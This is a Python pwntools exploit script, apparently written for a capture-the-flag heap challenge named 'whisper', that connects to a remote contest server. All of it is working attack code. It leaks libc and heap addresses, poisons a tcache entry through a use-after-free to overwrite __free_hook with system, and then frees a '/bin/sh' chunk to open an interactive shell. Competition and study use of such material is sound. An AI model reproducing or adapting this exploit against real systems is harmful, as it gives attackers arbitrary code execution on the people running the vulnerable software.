#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./whisper', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = remote("offsec.m0lecon.it", 13534)

def create(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'size: ',  str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    return p.recv(8)

# ── Stage 1: libc leak ─────────────────────────────────────────────────
create(1, 0x20,  b'small1')          # small, below big
create(2, 0x500, b'big')             # large → will hit unsorted bin
create(3, 0x20,  b'guard')           # guard: prevents top-chunk merge

free(2)                              # → unsorted bin, fd = main_arena+96

leak = u64(show(2))
log.info(f"raw leak: {hex(leak)}")

# Bug 1 fix: no extra -0x60
main_arena_offset = 0x7ffff7f94ac0 - 0x7ffff7dd5000
libc.address = leak - main_arena_offset

#libc.address = leak - libc.sym['main_arena'] - 96
log.success(f"libc base:   {hex(libc.address)}")

system    = libc.sym['system']
free_hook = libc.sym['__free_hook']
log.success(f"system:      {hex(system)}")
log.success(f"__free_hook: {hex(free_hook)}")

# ── Stage 2: heap leak for safe-linking ────────────────────────────────
create(4, 0x20, b'small4')
create(5, 0x20, b'small5')

free(4)
free(5)   # tcache head → chunk5 → chunk4

# Bug 2 fix: leak mangled fd to get heap base
mangled   = u64(show(5))
heap_base = mangled << 12
log.success(f"heap base:   {hex(heap_base)}")

mangled_target = free_hook ^ (heap_base >> 12)

# UAF: poison chunk5's fd
edit(5, p64(mangled_target))

# ── Stage 3: overwrite __free_hook with system ─────────────────────────
create(6, 0x20, b'X' * 8)           # drains real chunk5
create(7, 0x20, p64(system))        # lands on __free_hook, writes system

# ── Stage 4: trigger system("/bin/sh") ────────────────────────────────
# Bug 4 fix: content of chunk = argument to system
create(8, 0x20, b'/bin/sh\x00')
free(8)   # → __free_hook(ptr) → system("/bin/sh")

p.interactive()
